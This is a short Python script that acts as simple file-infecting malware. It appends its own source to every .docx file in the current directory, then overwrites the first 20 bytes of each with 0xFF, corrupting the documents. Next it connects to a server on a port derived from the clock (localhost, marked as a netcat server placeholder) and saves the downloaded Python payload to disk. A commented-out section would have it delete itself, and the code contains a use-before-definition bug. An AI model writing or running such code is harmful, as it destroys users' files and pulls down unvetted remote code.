import os
import io
import re
import socket
import time
import subprocess
def append_copy_to_documents():
    directory = os.getcwd()  # Get the current directory
    with open (__file__,"r",encoding="utf-8") as file1:
        code_to_append=file1.read().encode()
    # code_to_append = __file__.encode()  # Get the code to append

    # Iterate through all files in the directory
    for filename in os.listdir(directory):
        if filename.endswith(".docx"):
            document_path = os.path.join(directory, filename)
           
            # Open the document in append binary mode
            with open(document_path, "ab") as document:
                # Append the code after the last 4 bytes
                document.seek(-4, os.SEEK_END)
                document.write(code_to_append)

            print(f"Appended a copy of the code to {filename}")

def read_first_20_bytes():
    directory = os.getcwd()  # Get the current directory

    # Iterate through all files in the directory
    for filename in os.listdir(directory):
        if os.path.isfile(filename) and filename.endswith(".docx"):
            with open(filename, "r+b") as file:
                file.write(b"\xFF" * 20)

            print(f"Replaced the first 20 bytes of {filename} with FF FF FF FF ...")

def receive_file(connection, port):
    file_name = f"file_from_server_variant_{port}.py"
    print("FILENAME:", file_name)
    with open(file_name, "wb") as file:
        while True:
            data = connection.recv(4096)
            if not data:
                break
            file.write(data)
    print(f"Received file from server on port {port} and saved as '{file_name}'")
   
    # Delete the current Python program
    # try:
    #     current_file = os.path.abspath(__file__)
    #     os.remove(current_file)
    # except Exception as e:
    #     print("Error while deleting the current program:", e)


# def connect_to_server(port):
#     server_ip = "127.0.0.1"  # Replace this with the IP address of your netcat server

#     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     try:
#         print(f"before connection {port}")
#         try:
#             client.connect((server_ip, port))
#             print(f"after connection {port}")
#         except Exception as e :
#             print(f"No server exists at port {port} error is: {e}")
        
#         print(f"before calling receivefile with port {port}")
#         receive_file(client, port)
#     except ConnectionRefusedError:
#         print(f"No server exists at port {port}")
#     finally:
#         client.close()

def get_last_4_chars(filename):
    # Extract the last 4 characters from the filename
    return filename[-7:-3]

def connect_to_server(port):
    server_ip = "127.0.0.1"  # Replace this with the IP address of your netcat server

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        while True:
            # Get the last 4 characters of the current script's filename
            current_filename = __file__
            print(current_filename)
            last_4_chars = get_last_4_chars(current_filename)
            
            if int(last_4_chars) != port:
                break
            else:
                port =(current_time % 6)* 1025
                if port==0:
                    port=1025 

        print(f"before connection {port}")
        try:
            client.connect((server_ip, port))
            print(f"after connection {port}")
        except Exception as e :
            print(f"No server exists at port {port} error is: {e}")
        
        print(f"before calling receivefile with port {port}")
        receive_file(client, port)
    except ConnectionRefusedError:
        print(f"No server exists at port {port}")
    finally:
        client.close()




# Example usage
append_copy_to_documents()
read_first_20_bytes()
# contents,dest_path=send_data_to_socket("192.168.61.78", 8091)

###########
current_time = int(time.time())
port = (current_time % 6)* 1025
if port==0:
    port=1025
connect_to_server(port)
########
